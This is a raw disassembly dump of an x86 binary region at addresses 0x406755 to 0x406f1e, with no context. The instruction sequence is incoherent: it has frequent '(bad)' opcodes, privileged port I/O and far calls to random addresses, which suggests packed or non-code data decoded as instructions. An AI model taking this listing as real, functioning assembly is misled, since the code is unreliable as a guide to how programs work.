  406755:	lods   al,BYTE PTR ds:[esi]
  406756:	adc    ecx,DWORD PTR [esi-0x71]
  406759:	cmp    al,0x72
  40675b:	in     al,dx
  40675c:	add    BYTE PTR gs:[bx],al
  406760:	outs   dx,DWORD PTR ds:[esi]
  406761:	je     0x4067a4
  406763:	fs fs push ebx
  406766:	jne    0x4067ca
  406768:	cmp    esi,edx
  40676a:	enter  0x4d23,0x75
  40676e:	ins    BYTE PTR es:[edi],dx
  40676f:	inc    esp
  406770:	imul   esi,DWORD PTR [esi+0x49],0x93e40864
  406777:	mov    bl,0x9f
  406779:	pop    ss
  40677a:	outs   dx,DWORD PTR ds:[esi]
  40677b:	fs das 
  40677d:	outs   dx,BYTE PTR ds:[esi]
  40677e:	dec    edi
  40677f:	jb     0x406781
  406781:	lods   eax,DWORD PTR ds:[esi]
  406782:	dec    esi
  406783:	push   ds
  406784:	jns    0x4067de
  406786:	outs   dx,DWORD PTR ds:[esi]
  406787:	jb     0x4067cc
  406789:	ins    DWORD PTR es:[edi],dx
  40678a:	jo     0x4067c0
  40678c:	sbb    eax,0xf7be48e4
  406791:	outs   dx,DWORD PTR ds:[esi]
  406792:	ins    DWORD PTR es:[edi],dx
  406793:	push   ebx
  406794:	je     0x4067b4
  406796:	rsqrtps xmm7,XMMWORD PTR [eax]
  406799:	mov    al,0x2f
  40679b:	fldcw  WORD PTR [edi]
  40679d:	inc    esp
  40679e:	popa   
  40679f:	je     0x406806
  4067a1:	adc    DWORD PTR [edi+0x79],eax
  4067a4:	pop    ds
  4067a5:	lahf   
  4067a6:	mov    ebx,0x6f42bf25
  4067ab:	outs   dx,DWORD PTR ds:[esi]
  4067ac:	ins    BYTE PTR es:[edi],dx
  4067ad:	(bad)  
  4067af:	je     0x406823
  4067b1:	inc    ebx
  4067b2:	jns    0x4067eb
  4067b4:	mov    al,0x97
  4067b6:	nop
  4067b7:	add    BYTE PTR [edi+0xf],al
  4067ba:	aaa    
  4067bb:	shl    BYTE PTR ds:0xc1bba10f,0xb6
  4067c2:	lock mov cl,0xb0
  4067c5:	cmp    BYTE PTR [eax+0x2],ah
  4067c8:	enter  0x6bb6,0x2e
  4067cc:	cmp    eax,0xf05a6c8c
  4067d1:	add    eax,0xcc4b8c5a
  4067d6:	add    DWORD PTR [edi-0x7e],0x60
  4067da:	sub    DWORD PTR [edx+0x20ff62f8],edx
  4067e0:	mov    edx,0xc62ed93
  4067e5:	sub    eax,0xd809cccc
  4067ea:	fld    QWORD PTR [ecx-0x16]
  4067ed:	in     al,dx
  4067ee:	adc    ah,BYTE PTR [edx+0x1f403e9]
  4067f4:	adc    eax,0x2ddb06c0
  4067f9:	dec    eax
  4067fa:	test   DWORD PTR [esi-0x2],0x785f0817
  406801:	mov    bh,0xd
  406803:	or     al,BYTE PTR [esp+esi*8]
  406806:	or     BYTE PTR [ebx+0x3],dh
  406809:	add    BYTE PTR [edi+esi*4-0x7fb1234d],dh
  406810:	jmp    0x4067f6
  406812:	fild   DWORD PTR [ebx]
  406814:	call   0xd3aedcf5
  406819:	xor    al,0x4d
  40681b:	test   al,0x88
  40681d:	les    esi,FWORD PTR [eax-0x1c]
  406820:	fidivr DWORD PTR [ebx]
  406822:	scas   eax,DWORD PTR es:[edi]
  406823:	cmp    ebx,ecx
  406825:	jne    0x406846
  406827:	test   al,0x3
  406829:	cld    
  40682a:	sub    bl,al
  40682c:	adc    edi,DWORD PTR [edi+ebx*1+0x75de1428]
  406833:	adc    esp,DWORD PTR [ebx+eax*1+0x12]
  406837:	push   esp
  406838:	inc    ebx
  406839:	jne    0x406862
  40683b:	and    al,0x58
  40683d:	xlat   BYTE PTR ds:[ebx]
  40683e:	push   ds
  40683f:	shl    DWORD PTR [ebx],0x1d
  406842:	jmp    0x4068bf
  406844:	pop    es
  406845:	sbb    BYTE PTR [esi],cl
  406847:	idiv   ah
  406849:	add    dh,BYTE PTR [ebx+0x15081060]
  40684f:	jae    0x406851
  406851:	inc    esp
  406852:	adc    al,ch
  406854:	sysret 
  406856:	inc    esp
  406857:	mov    eax,0x7254ec77
  40685c:	in     al,0x44
  40685e:	mov    eax,0x45165f0c
  406863:	pop    edx
  406864:	sub    BYTE PTR [esi+0x42d21155],al
  40686a:	xchg   BYTE PTR [edx+0x63a8db91],dh
  406870:	test   al,0x8b
  406872:	and    ah,BYTE PTR [eax+0x7]
  406875:	adc    eax,0xbc3ed445
  40687a:	enter  0xc2e,0x93
  40687e:	or     al,0xb9
  406880:	arpl   WORD PTR [ecx+edi*4],cx
  406883:	shr    DWORD PTR [eax+0x21699008],0x43
  40688a:	leave  
  40688b:	pusha  
  40688c:	arpl   WORD PTR [eax+0x70],si
  40688f:	arpl   WORD PTR [edi],cx
  406891:	or     DWORD PTR [ebx],eax
  406893:	pop    ss
  406894:	sub    eax,DWORD PTR [ecx+0x72]
  406897:	addr16 gs aam 0x1f
  40689b:	nop
  40689c:	or     al,0x65
  40689e:	arpl   sp,dx
  4068a0:	inc    edx
  4068a1:	popa   
  4068a2:	fs dec eax
  4068a4:	clc    
  4068a5:	lds    esi,FWORD PTR [edx+0x9]
  4068a8:	cmp    eax,0x2bba3863
  4068ad:	fwait
  4068ae:	or     edx,DWORD PTR [eax+0x63ba38bc]
  4068b4:	retf   0xa164
  4068b7:	ins    BYTE PTR es:[edi],dx
  4068b8:	adc    BYTE PTR [edx],bl
  4068ba:	sub    ebx,DWORD PTR [si-0x129d]
  4068bf:	nop
  4068c0:	adc    DWORD PTR [eax+0x5b41189c],0xd156f623
  4068ca:	popa   
  4068cb:	jns    0x4068f2
  4068cd:	imul   esp,DWORD PTR [ebp+0x64],0x66
  4068d1:	mov    edi,0xb645e488
  4068d6:	add    al,0xbb
  4068d8:	addr16 add al,0xbb
  4068db:	xchg   esp,eax
  4068dc:	sbb    al,0xe6
  4068de:	cli    
  4068df:	inc    ebx
  4068e0:	jb     0x406947
  4068e2:	mov    WORD PTR [edi+0x6c],fs
  4068e5:	sbb    BYTE PTR [edx],dh
  4068e7:	adc    BYTE PTR [edx],dh
  4068e9:	ins    BYTE PTR es:[edi],dx
  4068ea:	adc    al,0xe4
  4068ec:	mov    al,0x5
  4068ee:	sbb    bh,BYTE PTR [ebp-0x34938fb7]
  4068f4:	rol    BYTE PTR [ecx+0x3],1
  4068f7:	xchg   edx,eax
  4068f8:	mov    eax,ds:0x6c3c64d0
  4068fd:	dec    ecx
  4068fe:	xchg   BYTE PTR [edi+0x38],ah
  406901:	mov    esp,0x48070a63
  406906:	pop    esi
  406907:	cmp    BYTE PTR [ebp+edx*2+0x3650fb6e],bh
  40690e:	or     BYTE PTR [edi],dh
  406910:	pop    edi
  406911:	arpl   WORD PTR [edx+ebx*4-0x64],si
  406915:	arpl   WORD PTR [ebx],sp
  406917:	push   edx
  406918:	popa   
  406919:	mov    esp,0x84b5631f
  40691e:	xor    BYTE PTR [ecx+0x61],0x70
  406922:	xchg   ebx,eax
  406923:	arpl   WORD PTR [eax+0x63],bp
  406926:	jecxz  0x406938
  406928:	or     al,0xf9
  40692a:	inc    ecx
  40692b:	sbb    esi,edi
  40692d:	mov    esp,0xd0524c15
  406932:	ret    0x3a48
  406935:	cld    
  406936:	mov    eax,ds:0x53b93047
  40693b:	pop    esp
  40693c:	mov    eax,0x600ac9cc
  406941:	and    eax,0x6dbd0527
  406946:	sub    al,0x80
  406948:	shl    DWORD PTR [edi],0xe4
  40694b:	test   ah,ch
  40694d:	add    dl,BYTE PTR [edx-0x17695661]
  406953:	in     al,0x80
  406955:	gs xchg edi,eax
  406957:	mov    ebp,0xe2bf5108
  40695c:	in     al,dx
  40695d:	mov    ecx,eax
  40695f:	mov    al,0x80
  406961:	pop    ecx
  406962:	push   es
  406963:	jns    0x406960
  406965:	mov    BYTE PTR [ebp-0xc],0xb
  406969:	adc    ebp,eax
  40696b:	mov    eax,esi
  40696d:	call   0x81c4e6a
  406972:	push   0x16a77fc
  406977:	xchg   ebx,eax
  406978:	in     al,0xa1
  40697a:	jo     0x40696f
  40697c:	mov    esp,0xe4990190
  406981:	fcomp  DWORD PTR [esi+0x724289bd]
  406987:	push   edi
  406988:	retf   
  406989:	in     al,0xba
  40698b:	add    eax,ebx
  40698d:	in     al,0x40
  40698f:	dec    esi
  406990:	push   ss
  406991:	out    dx,eax
  406992:	out    dx,al
  406993:	mov    ebp,0x204c8534
  406998:	das    
  406999:	clc    
  40699a:	mov    bh,0xf5
  40699c:	and    DWORD PTR [edi-0x4178b1b8],ebp
  4069a2:	xor    ah,0x2
  4069a5:	in     al,0x5
  4069a7:	xor    al,al
  4069a9:	mov    ?,WORD PTR [esi-0xdf8de87]
  4069af:	fidivr WORD PTR [esi-0x5d4547e0]
  4069b5:	adc    DWORD PTR [edx+0x2],esi
  4069b8:	in     eax,0xbe
  4069ba:	and    esp,eax
  4069bc:	fld    st(0)
  4069be:	out    0xea,eax
  4069c0:	sub    eax,0x223365c1
  4069c5:	clc    
  4069c6:	daa    
  4069c7:	cmp    eax,0x8002000a
  4069cc:	jg     0x406a07
  4069ce:	xor    eax,0xbe022d57
  4069d3:	add    eax,0x271d1d0c
  4069d8:	mov    ch,0xab
  4069da:	outs   dx,BYTE PTR ds:[esi]
  4069db:	mov    dh,0x13
  4069dd:	clc    
  4069de:	sub    eax,0x5cc7bffe
  4069e3:	add    DWORD PTR [ecx],edi
  4069e5:	sti    
  4069e6:	out    dx,al
  4069e7:	pxor   mm6,QWORD PTR [eax+0x23082db1]
  4069ee:	je     0x406a2f
  4069f0:	dec    eax
  4069f1:	je     0x406a55
  4069f3:	push   cs
  4069f4:	or     esi,DWORD PTR [ebx+0x6180060d]
  4069fa:	add    dh,BYTE PTR [edx]
  4069fc:	lahf   
  4069fd:	mov    bh,0x91
  4069ff:	lods   eax,DWORD PTR ds:[esi]
  406a00:	mov    ch,0x2b
  406a02:	dec    eax
  406a03:	adc    esp,eax
  406a05:	dec    ecx
  406a06:	cmp    edi,ebp
  406a08:	add    cl,bh
  406a0a:	jbe    0x4069c7
  406a0c:	and    BYTE PTR [esi-0x4ef64f54],bl
  406a12:	add    ecx,ebx
  406a14:	loopne 0x406a2d
  406a16:	sbb    ecx,eax
  406a18:	or     ecx,DWORD PTR [eax+0x322f25b9]
  406a1e:	or     DWORD PTR [edi],ebx
  406a20:	lods   eax,DWORD PTR fs:[esi]
  406a22:	mov    al,ds:0xf3a8a1f8
  406a27:	gs clc 
  406a29:	xchg   edi,eax
  406a2a:	cld    
  406a2b:	sub    eax,0xf4552f5b
  406a30:	mov    eax,ds:0x829bf4b0
  406a35:	xchg   ebp,eax
  406a36:	xor    al,0xec
  406a38:	add    al,0x4
  406a3a:	cmc    
  406a3b:	pop    es
  406a3c:	nop
  406a3d:	int    0x64
  406a3f:	dec    ebx
  406a40:	lock push eax
  406a42:	mov    edx,0xc803a1ec
  406a47:	out    dx,al
  406a48:	xchg   edx,eax
  406a49:	pusha  
  406a4a:	in     al,dx
  406a4b:	and    eax,0xade8bb20
  406a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a51:	cdq    
  406a52:	in     al,0xa1
  406a54:	int3   
  406a55:	repz call 0x8618b8df
  406a5b:	cmp    al,0x13
  406a5d:	loopne 0x406a83
  406a5f:	xchg   edi,eax
  406a60:	jmp    0x406ad5
  406a62:	imul   BYTE PTR [esi]
  406a64:	imul   esp,DWORD PTR [edx],0x5
  406a67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a68:	and    ah,al
  406a6a:	mov    edx,0xb5c0a648
  406a6f:	adc    ebp,ebx
  406a71:	push   eax
  406a72:	adc    BYTE PTR [esi-0x49f5a30],cl
  406a78:	(bad)  
  406a79:	enter  0xcc7d,0xb
  406a7d:	mov    DWORD PTR [ebp-0x30],ebx
  406a80:	push   es
  406a81:	aam    0xd1
  406a83:	pop    ecx
  406a84:	ss (bad) 
  406a86:	mov    ds:0x98849ac4,al
  406a8b:	(bad)  
  406a8c:	fcom   st(1)
  406a8e:	sahf   
  406a8f:	mov    BYTE PTR [esi-0x24],ah
  406a92:	enter  0xc057,0x65
  406a96:	popf   
  406a97:	inc    eax
  406a98:	ss xchg edi,eax
  406a9a:	cwde   
  406a9b:	ror    BYTE PTR [edi+ebx*2],0x34
  406a9f:	rcr    esi,0x8
  406aa2:	xor    dl,BYTE PTR [esi]
  406aa4:	push   esp
  406aa5:	add    ah,BYTE PTR [ebp+0x1508bae0]
  406aab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406aac:	pusha  
  406aad:	dec    eax
  406aae:	fsubrp st(7),st
  406ab0:	or     DWORD PTR [ecx],eax
  406ab2:	in     al,dx
  406ab3:	pop    esp
  406ab4:	test   BYTE PTR [eax],bl
  406ab6:	scas   al,BYTE PTR es:[edi]
  406ab7:	in     al,0x1b
  406ab9:	push   ss
  406aba:	shl    bl,0xc6
  406abd:	sub    al,0x54
  406abf:	sub    ebx,0xbc3f4d38
  406ac5:	inc    esp
  406ac6:	mov    bh,0x7
  406ac8:	je     0x406ad7
  406aca:	fld    st(2)
  406acc:	mov    edx,ecx
  406ace:	mov    edx,0x2810eb04
  406ad3:	shr    esp,1
  406ad5:	popa   
  406ad6:	or     dh,ah
  406ad8:	jmp    0x406b0d
  406ada:	xlat   BYTE PTR ds:[ebx]
  406adb:	inc    edx
  406adc:	push   ds
  406add:	enter  0xe7c9,0xc6
  406ae1:	shr    DWORD PTR [ebx+esi*8+0x23],0xe4
  406ae6:	add    al,0x72
  406ae8:	push   eax
  406ae9:	mov    esp,0xc144c1cd
  406aee:	pop    ebp
  406aef:	add    al,0x13
  406af1:	add    ecx,0xa2378a00
  406af7:	fbstp  TBYTE PTR [eax+0x304c154]
  406afd:	adc    al,0xc1
  406aff:	lea    edi,[ebx]
  406b01:	xchg   esp,eax
  406b02:	cmp    DWORD PTR [eax+0x166f146d],0xf
  406b09:	lahf   
  406b0a:	ret    0x4f48
  406b0d:	add    al,0xac
  406b0f:	jge    0x406af4
  406b11:	ja     0x406ac0
  406b13:	xor    eax,0x65046f0c
  406b18:	xor    bh,bh
  406b1a:	test   BYTE PTR [ecx+0x78a9ad7f],al
  406b20:	and    al,BYTE PTR ds:0xd93d368c
  406b26:	mov    esi,DWORD PTR [ebp-0x2c]
  406b29:	out    0x36,eax
  406b2b:	test   BYTE PTR [eax],0x3
  406b2e:	pushf  
  406b2f:	(bad)  
  406b30:	dec    ecx
  406b31:	jne    0x406b75
  406b33:	pushf  
  406b34:	xchg   BYTE PTR [edi+0x22],bh
  406b37:	das    
  406b38:	and    BYTE PTR ds:0xeb59ef28,0x62
  406b3f:	push   esp
  406b40:	mov    cl,0x7b
  406b42:	outs   dx,DWORD PTR ds:[esi]
  406b43:	add    cl,BYTE PTR [ecx+0x916828c]
  406b49:	push   edx
  406b4a:	dec    eax
  406b4b:	sub    dl,BYTE PTR [edi]
  406b4d:	inc    ecx
  406b4e:	mov    ecx,0xfffcb1e0
  406b53:	push   ebp
  406b54:	jl     0x406b74
  406b56:	sub    al,0x27
  406b58:	call   0xfcc66b59
  406b5d:	rcl    DWORD PTR [esi],1
  406b5f:	jge    0x406b2d
  406b61:	mov    bh,0x5
  406b63:	test   BYTE PTR [eax+0x1],0x20
  406b67:	stos   DWORD PTR es:[edi],eax
  406b68:	push   edi
  406b69:	add    dl,0xd9
  406b6c:	mov    bh,0xb0
  406b6e:	xor    BYTE PTR [ecx],0x38
  406b71:	adc    eax,0xad14d066
  406b76:	adc    BYTE PTR [ecx],0xc7
  406b79:	cmova  esp,DWORD PTR [ebx+0xd]
  406b7d:	aam    0x6
  406b7f:	dec    esp
  406b80:	and    bh,dl
  406b82:	xchg   ebp,eax
  406b83:	das    
  406b84:	(bad)  
  406b85:	(bad)  
  406b86:	push   ecx
  406b87:	(bad)  
  406b88:	in     al,dx
  406b89:	inc    eax
  406b8a:	je     0x406b9f
  406b8c:	and    al,0x34
  406b8e:	add    BYTE PTR [ebx-0x4a],cl
  406b91:	pop    ecx
  406b92:	mov    dl,0xcd
  406b94:	clc    
  406b95:	jmp    0x406ba6
  406b97:	adc    dl,BYTE PTR [eax]
  406b99:	push   cs
  406b9a:	clc    
  406b9b:	push   ebp
  406b9c:	out    dx,eax
  406b9d:	pop    ecx
  406b9e:	outs   dx,BYTE PTR ds:[esi]
  406b9f:	movzx  eax,WORD PTR [eax]
  406ba2:	lock popf 
  406ba4:	add    eax,0x1dfb1b67
  406ba9:	or     ebp,DWORD PTR [ebx+0x43]
  406bac:	xor    edi,edi
  406bae:	lea    esi,[ebp-0x17e4393a]
  406bb4:	add    DWORD PTR [ebp+0x37057a21],edi
  406bba:	push   eax
  406bbb:	lea    eax,[edi+0x1]
  406bbe:	idiv   BYTE PTR [esi]
  406bc0:	jbe    0x406b74
  406bc2:	mov    bh,al
  406bc4:	mov    ds:0x858d38c2,eax
  406bc9:	hlt    
  406bca:	adc    BYTE PTR [ebx],bl
  406bcc:	dec    esi
  406bce:	inc    bx
  406bd0:	push   eax
  406bd1:	lods   al,BYTE PTR ds:[esi]
  406bd2:	inc    eax
  406bd3:	xchg   ebp,eax
  406bd4:	and    DWORD PTR [ebx],ebp
  406bd6:	push   eax
  406bd7:	add    al,0x42
  406bd9:	and    eax,0xf661600
  406bde:	nop
  406bdf:	inc    edi
  406be0:	test   cl,dl
  406be2:	mov    eax,ds:0x754becbd
  406be7:	sahf   
  406be8:	jne    0x406c04
  406bea:	inc    ebx
  406beb:	inc    esi
  406bec:	inc    esi
  406bed:	add    eax,0x6359b602
  406bf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bf3:	or     ch,BYTE PTR [ebp-0x39]
  406bf6:	or     BYTE PTR [esi-0xcdb8d95],dh
  406bfc:	push   ebp
  406bfd:	and    eax,0x1bccb1af
  406c02:	fnstenv [esi]
  406c04:	sbb    BYTE PTR [ecx-0x7f],0x2a
  406c08:	jae    0x406bf6
  406c0a:	test   DWORD PTR ds:0xd81c82f7,ebp
  406c10:	jbe    0x406c6a
  406c12:	push   ds
  406c13:	or     dh,BYTE PTR [edi]
  406c15:	popa   
  406c16:	jae    0x406c8e
  406c18:	mov    ah,0x50
  406c1a:	push   ebp
  406c1b:	ss cld 
  406c1d:	jne    0x406bd4
  406c1f:	add    ebp,DWORD PTR [eax]
  406c21:	mov    BYTE PTR [ecx],cl
  406c23:	inc    eax
  406c24:	in     al,0x9e
  406c26:	in     al,0xf7
  406c28:	sub    eax,0x2b83c280
  406c2d:	push   edx
  406c2e:	rcl    BYTE PTR [edi],0x4
  406c31:	das    
  406c32:	sti    
  406c33:	(bad)  
  406c34:	adc    al,0x73
  406c36:	or     eax,0x5beb1f53
  406c3b:	mov    ecx,0x7054fd04
  406c40:	add    DWORD PTR [ebp+0xf],esi
  406c43:	test   al,0x8d
  406c45:	inc    ebx
  406c46:	or     BYTE PTR [eax+esi*4+0x74],dl
  406c4a:	and    eax,DWORD PTR [ebx+0x45]
  406c4d:	adc    eax,0xbc2e0a01
  406c52:	push   esp
  406c53:	jl     0x406bf8
  406c55:	or     BYTE PTR [esp+esi*1],bl
  406c58:	idiv   cx
  406c5b:	and    BYTE PTR [ebx+ebx*1-0x2c],dh
  406c5f:	(bad)  
  406c60:	or     al,BYTE PTR [ebx+0x24eb58b2]
  406c66:	push   ecx
  406c67:	mov    al,0x0
  406c6a:	je     0x406c9a
  406c6c:	int    0xc
  406c6e:	cmovne eax,eax
  406c71:	outs   dx,BYTE PTR ds:[esi]
  406c72:	mov    bl,BYTE PTR [ecx]
  406c74:	and    al,0xeb
  406c76:	or     ebx,DWORD PTR [ebp+eax*1+0x6f]
  406c7a:	mov    ah,0x48
  406c7c:	fwait
  406c7d:	cmp    DWORD PTR [eax-0x73f98a41],esi
  406c83:	ins    DWORD PTR es:[edi],dx
  406c84:	cld    
  406c85:	pop    esi
  406c86:	push   cs
  406c87:	cmp    eax,0x500bd4b3
  406c8c:	mov    edx,0x54e48658
  406c91:	gs lahf 
  406c93:	mov    ah,0x9c
  406c95:	fsubr  st(4),st
  406c97:	mov    edi,cs
  406c99:	inc    ecx
  406c9a:	(bad)  
  406c9b:	clc    
  406c9c:	fimul  DWORD PTR [ecx-0x7b33bc5f]
  406ca2:	ins    BYTE PTR es:[edi],dx
  406ca3:	sub    al,0x9b
  406ca5:	add    ecx,DWORD PTR [eax+0x3f8c67b8]
  406cab:	xchg   ebp,eax
  406cac:	or     eax,0xe88f438b
  406cb1:	or     DWORD PTR [esp+eiz*2],ecx
  406cb4:	sub    ah,BYTE PTR [ebx+0x60]
  406cb7:	pop    esi
  406cb8:	mov    esp,ebx
  406cba:	sbb    DWORD PTR [eax+0x26],ecx
  406cbd:	fs fsub st(0),st
  406cc0:	call   0x23d285c8
  406cc5:	(bad)  
  406cc7:	sub    eax,0x491d22f0
  406ccc:	std    
  406ccd:	jl     0x406cd4
  406ccf:	or     al,0xb1
  406cd1:	jle    0x406cb2
  406cd3:	idiv   BYTE PTR [eax]
  406cd5:	inc    eax
  406cd6:	je     0x406cc4
  406cd8:	outs   dx,BYTE PTR ds:[esi]
  406cd9:	mov    ebp,0x89750005
  406cde:	xchg   cl,bl
  406ce0:	nop
  406ce1:	lea    edx,[eax-0x47f503a6]
  406ce7:	test   ecx,esi
  406ce9:	neg    esi
  406ceb:	or     al,0x20
  406ced:	or     bl,BYTE PTR [ebp+0x29]
  406cf0:	mov    DWORD PTR [eax+0x8],edx
  406cf3:	xlat   BYTE PTR ds:[ebx]
  406cf4:	es fs jns 0x406d56
  406cf8:	mov    ah,0x6c
  406cfa:	push   edx
  406cfb:	in     al,0xe8
  406cfd:	dec    esp
  406cfe:	enter  0x42c6,0xf6
  406d02:	loopne 0x406cf0
  406d04:	sbb    al,0x33
  406d06:	mov    esp,0x26b13d91
  406d0b:	call   DWORD PTR [ebp+0x38cf3fa4]
  406d11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d12:	push   DWORD PTR [esp+ebx*4+0x5312eb8d]
  406d19:	add    dl,al
  406d1b:	out    dx,al
  406d1c:	inc    eax
  406d1d:	push   es
  406d1e:	in     al,dx
  406d1f:	nop
  406d20:	or     al,0xb7
  406d22:	mov    WORD PTR [ecx-0x27],es
  406d25:	pop    eax
  406d26:	adc    ah,bl
  406d28:	xchg   edi,eax
  406d29:	add    ecx,ebx
  406d2b:	shl    bl,cl
  406d2d:	push   esp
  406d2e:	mov    al,ds:0xff3e1c93
  406d33:	xchg   esi,eax
  406d34:	xchg   ebx,eax
  406d35:	xchg   ecx,eax
  406d36:	cs push cs
  406d38:	push   esi
  406d39:	sbb    eax,0x6aff79ec
  406d3e:	sub    ah,al
  406d40:	imul   edx,DWORD PTR [edi],0xbd08d401
  406d46:	test   al,0x15
  406d48:	popa   
  406d49:	and    dh,BYTE PTR [esi]
  406d4b:	xchg   BYTE PTR [esp+edx*1],cl
  406d4e:	pop    edi
  406d4f:	ds cmp edi,edi
  406d52:	add    DWORD PTR [ebx],edx
  406d54:	mov    WORD PTR [ebx],di
  406d57:	inc    esi
  406d58:	aaa    
  406d59:	retf   
  406d5a:	shl    esp,cl
  406d5c:	sbb    DWORD PTR [esi],ebp
  406d5e:	adc    BYTE PTR [ecx-0x39],al
  406d61:	adc    BYTE PTR [ecx-0x53059624],bh
  406d67:	add    esi,0xffffff9a
  406d6a:	(bad)  
  406d6b:	mov    ds:0x352aebf8,al
  406d70:	(bad)  
  406d71:	pop    ss
  406d72:	xor    al,0x54
  406d74:	movups XMMWORD PTR [edx-0x68],xmm5
  406d78:	rcl    DWORD PTR [eax-0x3909fa00],cl
  406d7e:	sbb    BYTE PTR [eax+ebp*1-0x15],dh
  406d82:	or     al,0x7a
  406d84:	mov    cl,0x3f
  406d86:	adc    BYTE PTR [ebx-0xcc444bd],dh
  406d8c:	je     0x406dc4
  406d8e:	lods   eax,DWORD PTR ds:[esi]
  406d8f:	add    BYTE PTR [edx],ah
  406d91:	and    ebx,ebx
  406d93:	jne    0x406dbb
  406d95:	mov    ah,0x6
  406d97:	(bad)  
  406d98:	cmp    eax,0x2af0006e
  406d9d:	add    eax,0x156c0446
  406da2:	cmp    BYTE PTR [esi+0xc0582ad],dl
  406da8:	or     al,0x7a
  406daa:	add    BYTE PTR [ebp+0x22],cl
  406dad:	mov    gs,WORD PTR [eax-0x4a]
  406db0:	loopne 0x406d75
  406db2:	add    BYTE PTR [eax+0x1c],0xea
  406db6:	cmp    ah,BYTE PTR [ebx+0x1c51cd25]
  406dbc:	sbb    DWORD PTR [ecx-0x5f],0xfc0c46ac
  406dc3:	fiadd  DWORD PTR [esi+0x660dcc1a]
  406dc9:	mov    edx,0x5b447a20
  406dce:	sbb    al,0xc8
  406dd0:	inc    ax
  406dd2:	mov    esi,DWORD PTR [edi]
  406dd4:	inc    eax
  406dd5:	hlt    
  406dd6:	sbb    DWORD PTR [edx],0xffffffc9
  406dd9:	add    DWORD PTR [edi],0x687c9637
  406ddf:	push   ss
  406de0:	mov    esp,0x93c8fa58
  406de5:	or     DWORD PTR [ebx-0x3e],edi
  406de8:	dec    esi
  406de9:	push   esi
  406dea:	mov    eax,ds:0xde0b49b4
  406def:	add    BYTE PTR [eax-0x30],ch
  406df2:	mov    al,ds:0x4fcbd1f4
  406df7:	je     0x406dff
  406df9:	xor    ch,BYTE PTR [eax-0x14dca17d]
  406dff:	inc    edx
  406e00:	std    
  406e01:	adc    edi,esp
  406e03:	add    esi,DWORD PTR ds:0x9bfc6817
  406e09:	push   ecx
  406e0a:	rol    bl,0x9a
  406e0d:	sahf   
  406e0e:	gs xchg edx,eax
  406e10:	in     eax,dx
  406e11:	jmp    0x406e39
  406e13:	and    al,dh
  406e15:	lock hlt 
  406e17:	jo     0x406e6d
  406e19:	test   BYTE PTR [esi],cl
  406e1b:	pop    ecx
  406e1c:	hlt    
  406e1d:	add    eax,0x79a4a432
  406e22:	or     BYTE PTR [ebx],ah
  406e24:	add    ecx,ecx
  406e26:	lock sub eax,0x2b60a919
  406e2c:	psubsb mm0,mm3
  406e2f:	or     eax,0xc70c4879
  406e34:	leave  
  406e35:	cmp    eax,0xe49d8363
  406e3a:	sbb    ebx,esp
  406e3c:	push   ss
  406e3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e3e:	push   0x8
  406e40:	fst    DWORD PTR [ebx+0x46]
  406e43:	imul   eax,ebx,0x7e
  406e46:	and    BYTE PTR [ecx-0x1f632244],ah
  406e4c:	inc    ecx
  406e4d:	adc    DWORD PTR [eax*1-0x72f8234f],esi
  406e54:	cmc    
  406e55:	jbe    0x406e41
  406e57:	xor    eax,0x379af891
  406e5c:	push   es
  406e5d:	mov    ecx,0xa84d7f2f
  406e62:	push   cs
  406e63:	adc    ch,BYTE PTR [eax]
  406e65:	xor    ecx,DWORD PTR [eax]
  406e67:	inc    ebx
  406e68:	mov    BYTE PTR [ecx+ebx*4],dh
  406e6b:	int3   
  406e6c:	retf   
  406e6d:	scas   eax,DWORD PTR es:[edi]
  406e6e:	lods   al,BYTE PTR ds:[esi]
  406e6f:	xchg   ebp,eax
  406e70:	mov    edi,0xde90d933
  406e75:	sbb    al,0xce
  406e77:	inc    ebp
  406e78:	mov    esp,0x42d00976
  406e7d:	jle    0x406e4b
  406e7f:	xor    DWORD PTR [eax-0x427b1eb5],edi
  406e85:	mov    BYTE PTR [ecx-0x4b],al
  406e88:	sub    cl,dl
  406e8a:	xchg   ebp,eax
  406e8b:	sbb    ebp,esi
  406e8d:	hlt    
  406e8e:	rcr    DWORD PTR es:[edi+ebx*1+0x7],cl
  406e93:	ret    0x490c
  406e96:	mov    ?,WORD PTR [ecx]
  406e98:	xor    cl,BYTE PTR [esp+eax*4]
  406e9b:	mov    edx,0x584b57b8
  406ea0:	leave  
  406ea1:	xor    edx,ecx
  406ea3:	das    
  406ea4:	aas    
  406ea5:	jb     0x406eab
  406ea7:	cmp    DWORD PTR [edx-0x3f9ebfde],ecx
  406ead:	adc    BYTE PTR [ebp*2-0x23afd478],ah
  406eb4:	sub    cl,BYTE PTR [eax+0x7d8071f0]
  406eba:	xchg   edx,eax
  406ebb:	pop    esp
  406ebc:	mov    dl,0x2d
  406ebe:	fist   DWORD PTR [ecx-0x7e]
  406ec1:	in     al,0xad
  406ec3:	and    BYTE PTR [edi*2-0x3474a560],bl
  406eca:	adc    DWORD PTR [edi+ecx*1-0xb],eax
  406ece:	aam    0xac
  406ed0:	nop    DWORD PTR [eax-0x14]
  406ed4:	adc    esi,DWORD PTR [edx]
  406ed6:	ss popa 
  406ed8:	lods   eax,DWORD PTR ds:[esi]
  406ed9:	mov    ah,0x82
  406edb:	in     al,0x8a
  406edd:	xchg   esi,eax
  406ede:	xor    al,0x35
  406ee0:	imul   ebx,DWORD PTR [ecx-0x19],0xffffffd3
  406ee4:	push   cs
  406ee5:	loopne 0x406e6d
  406ee7:	sbb    al,0x30
  406ee9:	jle    0x406ed4
  406eeb:	iret   
  406eec:	lea    esp,[eax+ebp*8+0xb]
  406ef0:	sub    al,0x87
  406ef2:	shl    BYTE PTR [esp+edx*1-0x2ac878f1],1
  406ef9:	call   0x51f6:0x9804b76d
  406f00:	dec    edx
  406f01:	retf   
  406f02:	add    edx,DWORD PTR [esi+0x7e]
  406f05:	ins    BYTE PTR es:[edi],dx
  406f06:	call   0xf5d4:0xb39969a6
  406f0d:	adc    cl,ah
  406f0f:	jmp    0x2ff3d4ae
  406f14:	or     eax,0xf5426cd
  406f19:	cld    
  406f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f1b:	pop    ecx
  406f1c:	jle    0x406f1f
  406f1e:	add    ebp,DWORD PTR [edi-0x34]
